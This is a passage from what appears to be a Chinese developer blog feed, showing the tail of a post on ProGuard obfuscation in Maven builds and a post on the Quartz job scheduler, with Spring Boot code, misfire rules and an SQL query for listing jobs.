class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- proguard混淆插件. spring-boot-maven-plugin需要放到此插件的后面 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 之后打包后，会生成 proguard_map.txt 的映射文件(源码名称和混淆后名称的映射) --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.wvengen<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>proguard-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">id</span>&gt;</span>run-proguard<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goal</span>&gt;</span>proguard<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- JDK8及以下需要添加外部依赖的jar包, 否则部分场景容易报错: java.lang.VerifyError: Bad type on operand stack --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">libs</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">lib</span>&gt;</span>$&#123;java.home&#125;/lib/rt.jar<span class="tag">&lt;/<span class="name">lib</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">lib</span>&gt;</span>$&#123;java.home&#125;/lib/jce.jar<span class="tag">&lt;/<span class="name">lib</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">lib</span>&gt;</span>$&#123;java.home&#125;/lib/jsse.jar<span class="tag">&lt;/<span class="name">lib</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">libs</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">proguardInclude</span>&gt;</span>$&#123;project.parent.basedir&#125;/proguard.conf<span class="tag">&lt;/<span class="name">proguardInclude</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">attach</span>&gt;</span>true<span class="tag">&lt;/<span class="name">attach</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">attachArtifactClassifier</span>&gt;</span>pg<span class="tag">&lt;/<span class="name">attachArtifactClassifier</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 依赖模块 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">assembly</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">inclusions</span>&gt;</span></span><br><span class="line">                        <span class="comment">&lt;!-- 此时此模块中的依赖无法传递，需要手动引入 --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">inclusion</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cn.aezo.share.reporttable<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>report-table-common<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">inclusion</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">inclusions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">assembly</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-deploy-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 阻止默认的部署 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">id</span>&gt;</span>default-deploy<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">phase</span>&gt;</span>none<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 自定义部署 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">id</span>&gt;</span>deploy-essential<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">phase</span>&gt;</span>deploy<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goal</span>&gt;</span>deploy-file<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>$&#123;project.groupId&#125;<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>$&#123;project.artifactId&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;project.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">classifier</span>&gt;</span>pg<span class="tag">&lt;/<span class="name">classifier</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">                        <span class="comment">&lt;!-- 使用固定的pom文件安装到本地仓库，否则会自动生成(可能会丢失依赖从而导致依赖传递失败) --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">pomFile</span>&gt;</span>$&#123;basedir&#125;/pom.xml<span class="tag">&lt;/<span class="name">pomFile</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">file</span>&gt;</span>$&#123;basedir&#125;/target/$&#123;project.name&#125;-$&#123;project.version&#125;-pg.jar<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">repositoryId</span>&gt;</span>aezocn-maven-repo<span class="tag">&lt;/<span class="name">repositoryId</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">url</span>&gt;</span>file:///Users/smalle/gitwork/github/aezo-maven-repo<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 主项目中使用 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cn.aezo.share.reporttable<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>report-table-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;report-table.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">classifier</span>&gt;</span>pg<span class="tag">&lt;/<span class="name">classifier</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cn.aezo.share.reporttable<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>report-table-common<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>或者以maven-assembly-plugin -&gt; proguard-maven-plugin -&gt; spring-boot-maven-plugin顺序进行打包，参考<a href="https://huaweicloud.csdn.net/638764d9dacf622b8df8b1c5.html" target="_blank" rel="noopener">https://huaweicloud.csdn.net/638764d9dacf622b8df8b1c5.html</a></p></li></ul></li><li>springboot proguard 代码混淆相关问题 <a href="https://huaweicloud.csdn.net/638764d9dacf622b8df8b1c5.html" target="_blank" rel="noopener">https://huaweicloud.csdn.net/638764d9dacf622b8df8b1c5.html</a> </li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.guardsquare.com/&quot; target=&quot;_blank&quot; rel=&quot;noop
      
    
    </summary>
    
      <category term="java" scheme="http://blog.aezo.cn/categories/java/"/>
    
    
  </entry>
  
  <entry>
    <title>Quartz任务调度</title>
    <link href="http://blog.aezo.cn/2022/05/12/java/Quartz/"/>
    <id>http://blog.aezo.cn/2022/05/12/java/Quartz/</id>
    <published>2022-05-12T04:10:00.000Z</published>
    <updated>2022-08-15T07:58:13.379Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>Quartz是OpenSymphony开源组织在Job scheduling领域又一个开源项目</li><li><a href="http://www.quartz-scheduler.org/" target="_blank" rel="noopener">官网</a></li><li><a href="http://www.quartz-scheduler.org/documentation/quartz-2.3.0/" target="_blank" rel="noopener">Doc v2.3.0</a></li><li>核心概念<ul><li><code>Job</code> 表示一个工作，要执行的具体内容。此接口中只有一个方法，<code>void execute(JobExecutionContext context)</code></li><li><code>JobDetail</code> 表示一个具体的可执行的调度程序，Job 是这个可执行程调度程序所要执行的内容，另外 JobDetail 还包含了这个任务调度的方案和策略</li><li><code>Trigger</code> 代表一个调度参数的配置，什么时候去调<ul><li>为JobDetail字表，必须和JobDetail的JobKey一致(JobName+JobGroup)，一个JobDetail可以有多个Trigger</li></ul></li><li><code>Scheduler</code> 代表一个调度容器，一个调度容器中可以注册多个 JobDetail 和 Trigger。当 Trigger 与 JobDetail 组合，就可以被 Scheduler 容器调度了<ul><li>常用实现类为StdScheduler</li><li>而QuartzScheduler不属于此Scheduler，QuartzScheduler属于Quartz内置的调度器，用于增删改查任务即触发器等，调度逻辑在QuartzSchedulerThread中</li></ul></li></ul></li><li><a href="https://qqe2.com/cron" target="_blank" rel="noopener">cron表达式在线生成</a></li></ul><h2 id="执行原理"><a href="#执行原理" class="headerlink" title="执行原理"></a>执行原理</h2><ul><li>Quartz是通过一个调度线程不断的扫描数据库中的数据来获取到那些已经到点要触发的任务，然后调度执行它的。这个线程就是 QuartzSchedulerThread 类，其run方法中就是quartz的调度逻辑</li><li>QuartzSchedulerThread.run<ul><li><code>triggers = this.qsRsrcs.getJobStore().acquireNextTriggers(...)</code><ul><li>acquireNextTriggers 基于 JobStoreSupport类(实际是访问数据库)完成，获取将要触发的触发器集合<ul><li>executeInNonManagedTXLock()方法，保证了在分布式的情况，同一时刻，只有一个线程可以执行这个方法</li></ul></li></ul></li><li><code>this.qsRsrcs.getJobStore().triggersFired(triggers)</code><ul><li>triggersFired 也是在 JobStoreSupport 类中完成，改变trigger状态为 EXECUTING</li></ul></li><li><code>this.qsRsrcs.getThreadPool().runInThread(shell)</code> 将任务加入到线程池，等待CPU调度</li></ul></li><li>拉取待触发trigger <a href="https://www.jianshu.com/p/5fae8fd2feb0" target="_blank" rel="noopener">^1</a><ul><li>调度线程会一次性拉取距离现在，一定时间窗口内的，一定数量内的，即将触发的trigger信息。时间窗口和数量信息可通过参数配置<ul><li>idleWaitTime：默认30s，可通过配置属性org.quartz.scheduler.idleWaitTime设置</li><li>availThreadCount：获取可用（空闲）的工作线程数量，总会大于1，因为该方法会一直阻塞，直到有工作线程空闲下来。</li><li>maxBatchSize：一次拉取trigger的最大数量，默认是1，可通过org.quartz.scheduler.batchTriggerAcquisitionMaxCount改写</li><li>batchTimeWindow：时间窗口调节参数，默认是0，可通过org.quartz.scheduler.batchTriggerAcquisitionFireAheadTimeWindow改写</li><li>misfireThreshold：超过这个时间还未触发的trigger,被认为发生了misfire,默认60s，可通过org.quartz.jobStore.misfireThreshold设置</li></ul></li><li>调度线程一次会拉取NEXT_FIRE_TIME小于(now + idleWaitTime +batchTimeWindow)，大于(now - misfireThreshold)的，min(availThreadCount,maxBatchSize)个triggers。默认情况下，会拉取未来30s，过去60s之间还未fire的1个trigger。随后将这些triggers的状态由WAITING改为ACQUIRED，并插入fired_triggers表</li></ul></li><li>触发trigger <a href="https://www.jianshu.com/p/5fae8fd2feb0" target="_blank" rel="noopener">^1</a><ul><li>首先，会检查每个trigger的状态是不是ACQUIRED，如果是，则将状态改为EXECUTING</li><li>然后更新trigger的NEXT_FIRE_TIME，如果这个trigger的NEXT_FIRE_TIME为空，也就是未来不再触发，就将其状态改为COMPLETE</li><li>如果trigger不允许并发执行（即Job的实现类标注了<code>@DisallowConcurrentExecution</code>），则将状态变为BLOCKED，否则就将状态改为WAITING</li></ul></li><li>包装trigger，丢给工作线程池<ul><li>根据trigger信息实例化JobRunShell（实现了Thread接口），同时依据JOB_CLASS_NAME实例化Job，随后将JobRunShell实例丢入工作线程</li></ul></li><li>相关注解<ul><li><code>@DisallowConcurrentExecution</code> 加在Job类上，是否允许Job并发执行<ul><li>Quartz定时任务默认都是并发执行的，不会等待此trigger的上一次任务执行完毕，只要trigger间隔时间到就会执行。加上@DisallowConcurrentExecution注解则会等上一次任务执行完毕</li></ul></li><li><code>@PersistJobDataAfterExecution</code> 加在Job类上，是否持久化JobDataMap数据<ul><li>如果加了此注解，在执行任务时修改了JobDataMap的数据，则会将最终的数据持久化到数据库。下次执行任务则获取的新数据</li></ul></li></ul></li></ul><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ul><li><p>调度(scheduleJob)或恢复调度(resumeTrigger,resumeJob)后不同的misfire对应的处理规则. <a href="https://www.cnblogs.com/skyLogin/p/6927629.html" target="_blank" rel="noopener">参考</a></p><ul><li>参考<code>MisfireHandler.class</code>对应线程</li><li><p>CronTrigger</p><p>  withMisfireHandlingInstructionDoNothing<br>  ——不触发立即执行<br>  ——等待下次Cron触发频率到达时刻开始按照Cron频率依次执行</p><p>  withMisfireHandlingInstructionIgnoreMisfires<br>  ——以错过的第一个频率时间立刻开始执行<br>  ——重做错过的所有频率周期后<br>  ——当下一次触发频率发生时间大于当前时间后，再按照正常的Cron频率依次执行</p><p>  withMisfireHandlingInstructionFireAndProceed<br>  ——以当前时间为触发频率立刻触发一次执行<br>  ——然后按照Cron频率依次执行</p></li><li><p>SimpleTrigger</p><p>  withMisfireHandlingInstructionFireNow<br>  ——以当前时间为触发频率立即触发执行<br>  ——执行至FinalTIme的剩余周期次数<br>  ——以调度或恢复调度的时刻为基准的周期频率，FinalTime根据剩余次数和当前时间计算得到<br>  ——调整后的FinalTime会略大于根据starttime计算的到的FinalTime值</p><p>  withMisfireHandlingInstructionIgnoreMisfires<br>  ——以错过的第一个频率时间立刻开始执行<br>  ——重做错过的所有频率周期<br>  ——当下一次触发频率发生时间大于当前时间以后，按照Interval的依次执行剩下的频率<br>  ——共执行RepeatCount+1次</p><p>  withMisfireHandlingInstructionNextWithExistingCount<br>  ——不触发立即执行<br>  ——等待下次触发频率周期时刻，执行至FinalTime的剩余周期次数<br>  ——以startTime为基准计算周期频率，并得到FinalTime<br>  ——即使中间出现pause，resume以后保持FinalTime时间不变</p><p>  withMisfireHandlingInstructionNowWithExistingCount<br>  ——以当前时间为触发频率立即触发执行<br>  ——执行至FinalTIme的剩余周期次数<br>  ——以调度或恢复调度的时刻为基准的周期频率，FinalTime根据剩余次数和当前时间计算得到<br>  ——调整后的FinalTime会略大于根据starttime计算的到的FinalTime值</p><p>  withMisfireHandlingInstructionNextWithRemainingCount<br>  ——不触发立即执行<br>  ——等待下次触发频率周期时刻，执行至FinalTime的剩余周期次数<br>  ——以startTime为基准计算周期频率，并得到FinalTime<br>  ——即使中间出现pause，resume以后保持FinalTime时间不变</p><p>  withMisfireHandlingInstructionNowWithRemainingCount<br>  ——以当前时间为触发频率立即触发执行<br>  ——执行至FinalTIme的剩余周期次数<br>  ——以调度或恢复调度的时刻为基准的周期频率，FinalTime根据剩余次数和当前时间计算得到<br>  ——调整后的FinalTime会略大于根据starttime计算的到的FinalTime值</p><p>  MISFIRE_INSTRUCTION_RESCHEDULE_NOW_WITH_REMAINING_REPEAT_COUNT<br>  ——此指令导致trigger忘记原始设置的starttime和repeat-count<br>  ——触发器的repeat-count将被设置为剩余的次数<br>  ——这样会导致后面无法获得原始设定的starttime和repeat-count值</p></li></ul></li></ul><h2 id="基于springboot简单使用"><a href="#基于springboot简单使用" class="headerlink" title="基于springboot简单使用"></a>基于springboot简单使用</h2><ul><li>下列方式不会将任务持久化(即无需创建Quartz相关任务持久化表)</li><li>pom.xml</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--spring boot集成quartz--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-quartz<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>java</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DateTimeJob</span> <span class="keyword">extends</span> <span class="title">QuartzJobBean</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">executeInternal</span><span class="params">(JobExecutionContext jobExecutionContext)</span> <span class="keyword">throws</span> JobExecutionException </span>&#123;</span><br><span class="line">        <span class="comment">//获取JobDetail中关联的数据</span></span><br><span class="line">        String msg = (String) jobExecutionContext.getJobDetail().getJobDataMap().get(<span class="string">"msg"</span>);</span><br><span class="line">        System.out.println(<span class="string">"current time :"</span>+<span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy-MM-dd HH:mm:ss"</span>).format(<span class="keyword">new</span> Date()) + <span class="string">"---"</span> + msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">QuartzConfig</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> JobDetail <span class="title">printTimeJobDetail</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> JobBuilder.newJob(DateTimeJob.class)<span class="comment">//PrintTimeJob我们的业务类</span></span><br><span class="line">                .withIdentity(<span class="string">"DateTimeJob"</span>)<span class="comment">//可以给该JobDetail起一个id</span></span><br><span class="line">                <span class="comment">//每个JobDetail内都有一个Map，包含了关联到这个Job的数据，在Job类中可以通过context获取</span></span><br><span class="line">                .usingJobData(<span class="string">"msg"</span>, <span class="string">"Hello Quartz"</span>)<span class="comment">//关联键值对</span></span><br><span class="line">                .storeDurably()<span class="comment">//即使没有Trigger关联时，也不需要删除该JobDetail</span></span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Trigger <span class="title">printTimeJobTrigger</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        CronScheduleBuilder cronScheduleBuilder = CronScheduleBuilder.cronSchedule(<span class="string">"0/1 * * * * ?"</span>);</span><br><span class="line">        <span class="keyword">return</span> TriggerBuilder.newTrigger()</span><br><span class="line">                .forJob(printTimeJobDetail())<span class="comment">//关联上述的JobDetail</span></span><br><span class="line">                .withIdentity(<span class="string">"quartzTaskService"</span>)<span class="comment">//给Trigger起个名字</span></span><br><span class="line">                .withSchedule(cronScheduleBuilder)</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="基于数据库持久化任务案例"><a href="#基于数据库持久化任务案例" class="headerlink" title="基于数据库持久化任务案例"></a>基于数据库持久化任务案例</h2><ul><li>参考: <a href="https://blog.csdn.net/qq_34397273/article/details/116853291" target="_blank" rel="noopener">https://blog.csdn.net/qq_34397273/article/details/116853291</a><ul><li>源码: <a href="https://github.com/liululee/spring-boot-learning" target="_blank" rel="noopener">https://github.com/liululee/spring-boot-learning</a></li></ul></li><li>参考源码目录: org.quartz.impl.jdbcjobstore<ul><li>mysql表结构: <a href="https://blog.csdn.net/qq_30285985/article/details/112171744" target="_blank" rel="noopener">https://blog.csdn.net/qq_30285985/article/details/112171744</a> (含字段说明)</li><li>oracle表结构: <a href="https://blog.csdn.net/qq_34397273/article/details/116853291" target="_blank" rel="noopener">https://blog.csdn.net/qq_34397273/article/details/116853291</a></li></ul></li><li>查看任务列表</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 基于CRON_TRIGGERS</span></span><br><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    QRTZ_JOB_DETAILS.SCHED_NAME <span class="keyword">AS</span> <span class="string">"调度器"</span>,</span><br><span class="line">    QRTZ_JOB_DETAILS.JOB_GROUP <span class="keyword">AS</span> <span class="string">"任务组"</span>,</span><br><span class="line">    QRTZ_JOB_DETAILS.JOB_NAME <span class="keyword">AS</span> <span class="string">"任务代码"</span>,</span><br><span class="line">    QRTZ_JOB_DETAILS.DESCRIPTION <span class="keyword">AS</span> <span class="string">"任务描述"</span>,</span><br><span class="line">    QRTZ_CRON_TRIGGERS.CRON_EXPRESSION <span class="keyword">AS</span> <span class="string">"cron表达式"</span>,</span><br><span class="line">    QRTZ_TRIGGERS.TRIGGER_STATE <span class="keyword">AS</span> <span class="string">"任务状态"</span>,</span><br><span class="line">    <span class="keyword">case</span> <span class="keyword">when</span> QRTZ_TRIGGERS.PREV_FIRE_TIME &gt; <span class="number">0</span> <span class="keyword">then</span> (<span class="keyword">to_date</span>(<span class="string">'1970-01-01 08:00:00'</span>,<span class="string">'yyyy-mm-dd hh24:mi:ss'</span>) + QRTZ_TRIGGERS.PREV_FIRE_TIME/<span class="number">1000</span>/<span class="number">24</span>/<span class="number">60</span>/<span class="number">60</span>) <span class="keyword">end</span> <span class="string">"上次时间"</span>,</span><br><span class="line">    <span class="keyword">case</span> <span class="keyword">when</span> QRTZ_TRIGGERS.NEXT_FIRE_TIME &gt; <span class="number">0</span> <span class="keyword">then</span> (<span class="keyword">to_date</span>(<span class="string">'1970-01-01 08:00:00'</span>,<span class="string">'yyyy-mm-dd hh24:mi:ss'</span>) + QRTZ_TRIGGERS.NEXT_FIRE_TIME/<span class="number">1000</span>/<span class="number">24</span>/<span class="number">60</span>/<span class="number">60</span>) <span class="keyword">end</span> <span class="string">"下次时间"</span>,</span><br><span class="line">    <span class="keyword">case</span> <span class="keyword">when</span> QRTZ_TRIGGERS.START_TIME &gt; <span class="number">0</span> <span class="keyword">then</span> (<span class="keyword">to_date</span>(<span class="string">'1970-01-01 08:00:00'</span>,<span class="string">'yyyy-mm-dd hh24:mi:ss'</span>) + QRTZ_TRIGGERS.START_TIME/<span class="number">1000</span>/<span class="number">24</span>/<span class="number">60</span>/<span class="number">60</span>) <span class="keyword">end</span> <span class="string">"开始时间"</span>,</span><br><span class="line">    <span class="keyword">case</span> <span class="keyword">when</span> QRTZ_TRIGGERS.END_TIME &gt; <span class="number">0</span> <span class="keyword">then</span> (<span class="keyword">to_date</span>(<span class="string">'1970-01-01 08:00:00'</span>,<span class="string">'yyyy-mm-dd hh24:mi:ss'</span>) + QRTZ_TRIGGERS.END_TIME/<span class="number">1000</span>/<span class="number">24</span>/<span class="number">60</span>/<span class="number">60</span>) <span class="keyword">end</span> <span class="string">"结束时间"</span>,</span><br><span class="line">    QRTZ_JOB_DETAILS.JOB_CLASS_NAME <span class="keyword">AS</span> <span class="string">"任务执行类"</span></span><br><span class="line"><span class="keyword">FROM</span> QRTZ_JOB_DETAILS</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">JOIN</span> QRTZ_TRIGGERS <span class="keyword">ON</span> QRTZ_JOB_DETAILS.SCHED_NAME = QRTZ_TRIGGERS.SCHED_NAME</span><br><span class="line">    <span class="keyword">and</span> QRTZ_JOB_DETAILS.JOB_NAME = QRTZ_TRIGGERS.JOB_NAME <span class="keyword">and</span> QRTZ_JOB_DETAILS.JOB_GROUP = QRTZ_TRIGGERS.JOB_GROUP</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">JOIN</span> QRTZ_CRON_TRIGGERS <span class="keyword">ON</span> QRTZ_TRIGGERS.SCHED_NAME = QRTZ_CRON_TRIGGERS.SCHED_NAME</span><br><span class="line">    <span class="keyword">AND</span> QRTZ_TRIGGERS.TRIGGER_NAME = QRTZ_CRON_TRIGGERS.TRIGGER_NAME</span><br><span class="line">    <span class="keyword">AND</span> QRTZ_TRIGGERS.TRIGGER_GROUP = QRTZ_CRON_TRIGGERS.TRIGGER_GROUP</span><br><span class="line"><span class="keyword">where</span> <span class="number">1</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><h3 id="重复执行"><a href="#重复执行" class="headerlink" title="重复执行"></a>重复执行</h3><ul><li>Quartz会重复执行任务，特别是项目启动时 <a href="https://www.jianshu.com/p/5fae8fd2feb0" target="_blank" 